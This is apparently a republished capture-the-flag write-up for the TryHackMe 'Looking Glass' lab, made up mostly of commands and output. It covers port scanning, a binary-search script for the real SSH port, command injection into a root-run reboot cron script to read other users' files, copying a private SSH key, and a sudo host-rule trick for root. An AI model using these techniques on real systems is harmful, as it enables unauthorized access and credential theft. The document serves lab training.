# TryHackMe Looking Glass writeup

> 原文: https://www.ctfiot.com/27362.html
> ID: 27362


```
$ nmap -A -p- -sV 10.10.116.245
Nmap scan report for 10.10.116.245
Host is up (0.026s latency).
Not shown: 61489 closed tcp ports (conn-refused)
Bug in dicom-ping: no string output.
PORT STATE SERVICE VERSION
9000/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)

...(omit)...

13997/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13998/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13999/tcp open ssh Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6562.92 seconds
```



```
$ ssh 10.10.116.245 -p 9000
...(omit)...
Lower
Connection to 10.10.116.245 closed.
```



```
$ ssh 10.10.116.245 -p 13999 
...(omit)...
Higher
Connection to 10.10.116.245 closed.
```



```
import subprocess

host = '10.10.99.168'
min_port = 9000
max_port = 13999

curr_port = (min_port + max_port) // 2
while True:
 cmd = 'ssh -q -oStrictHostKeyChecking=no ' + host + ' -p ' + str(curr_port)
 output = subprocess.check_output(cmd, shell=True)
 print(str(curr_port) + ': ' + str(output.strip()))
 if output.strip() == b'Lower':
 min_port = curr_port
 curr_port = (curr_port + max_port) // 2
 elif output.strip() == b'Higher':
 max_port = curr_port
 curr_port = (curr_port + min_port) // 2
 else:
 print(output.strip())
 print('port: ' + str(curr_port))
 break
```



```
$ python3 bin-search.py
11499: b'Lower'
12749: b'Lower'
13374: b'Lower'
13686: b'Higher'
13530: b'Lower'
13608: b'Higher'
13569: b'Higher'
13549: b'Higher'
13539: b'Lower'
13544: b'Lower'
13546: b'Lower'
13547: b"You've found the real service.\r\nSolve the challenge to get access to the box\r\n
...(omit)...
port: 13547
```



```
$ ssh 10.10.99.168 -p 13547
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```



```
Enter Secret:
jabberwock:PatientlyCountTumblingHowever
Connection to 10.10.99.168 closed.
```



```
$ ssh jabberwock@10.10.99.168
...(omit)...
jabberwock@10.10.99.168's password: 
Last login: Fri Jul 3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$ ls
poem.txt twasBrillig.sh user.txt
```



```
jabberwock@looking-glass:~$ ls /home
alice humptydumpty jabberwock tryhackme tweedledee tweedledum
```



```
jabberwock@looking-glass:~$ cat twasBrillig.sh 
wall $(cat /home/jabberwock/poem.txt)
```



```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
 (root) NOPASSWD: /sbin/reboot
```



```
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```



```
wall $(ls -la /home/tweedledum > /home/jabberwock/ls.txt)
```



```
jabberwock@looking-glass:~$ sudo reboot
```



```
jabberwock@looking-glass:~$ cat ls.txt 
total 28
drwx------ 2 tweedledum tweedledum 4096 Jul 3 2020 .
drwxr-xr-x 8 root root 4096 Jul 3 2020 ..
lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -> /dev/null
-rw-r--r-- 1 tweedledum tweedledum 220 Jun 30 2020 .bash_logout
-rw-r--r-- 1 tweedledum tweedledum 3771 Jun 30 2020 .bashrc
-rw-r--r-- 1 tweedledum tweedledum 807 Jun 30 2020 .profile
-rw-r--r-- 1 root root 520 Jul 3 2020 humptydumpty.txt
-rw-r--r-- 1 root root 296 Jul 3 2020 poem.txt
```



```
wall $(cat /home/tweedledum/humptydumpty.txt > /home/jabberwock/humptydumpty.txt; cat /home/tweedledum/poem.txt > /home/jabberwock/tweedledum_poem.txt)
```



```
jabberwock@looking-glass:~$ cat humptydumpty.txt 
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
...(omit)...
jabberwock@looking-glass:~$ cat tweedledum_poem.txt 
 'Tweedledum and Tweedledee
 Agreed to have a battle;
 For Tweedledum said Tweedledee
 Had spoiled his nice new rattle.

 Just then flew down a monstrous crow,
 As black as a tar-barrel;
 Which frightened both the heroes so,
 They quite forgot their quarrel.'
```



```
the password is ***************
```



```
jabberwock@looking-glass:~$ su humptydumpty
Password:
humptydumpty@looking-glass:/home/jabberwock$
```



```
humptydumpty@looking-glass:~$ cat poetry.txt 
‘You seem very clever at explaining words, Sir,’ said Alice. ‘Would you kindly tell me the meaning of the poem called “Jabberwocky”?’

...(omit)...
```



```
humptydumpty@looking-glass:~$ ls -l /home
total 24
drwx--x--x 6 alice alice 4096 Jul 3 2020 alice
drwx------ 2 humptydumpty humptydumpty 4096 Jul 3 2020 humptydumpty
drwxrwxrwx 5 jabberwock jabberwock 4096 Feb 23 17:14 jabberwock
drwx------ 5 tryhackme tryhackme 4096 Jul 3 2020 tryhackme
drwx------ 3 tweedledee tweedledee 4096 Jul 3 2020 tweedledee
drwx------ 2 tweedledum tweedledum 4096 Jul 3 2020 tweedledum
```



```
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
...(omit)...
-----END RSA PRIVATE KEY-----
```



```
$ vi .ssh/id_rsa (上記の鍵をペースト)
$ chmod 600 .ssh/id_rsa
$ ssh -i .ssh/id_rsa alice@10.10.225.183
Last login: Fri Jul 3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$
```



```
alice@looking-glass:~$ ls
kitten.txt
alice@looking-glass:~$ cat kitten.txt 
She took her off the table as she spoke, and shook her backwards and forwards with all her might.
...(omit)...
```



```
alice@looking-glass:~$ grep -irl "alice" /etc 2> /dev/null
/etc/subuid
/etc/subgid
/etc/passwd-
/etc/sudoers.d/alice
/etc/group
/etc/passwd
```



```
alice@looking-glass:~$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```



```
user host=(run command user:run command group) command
```



```
alice@looking-glass:~$ sudo -h
sudo - execute a command as another user

...(omit)...

Options:
 -A, --askpass use a helper program for password prompting
 -b, --background run command in the background
 -C, --close-from=num close all file descriptors >= num
 -E, --preserve-env preserve user environment when running command
 --preserve-env=list preserve specific environment variables
 -e, --edit edit files instead of running a command
 -g, --group=group run command as the specified group name or ID
 -H, --set-home set HOME variable to target user's home dir
 -h, --help display help message and exit
 -h, --host=host run command on host (if supported by plugin)
...(omit)...
```



```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~#
```
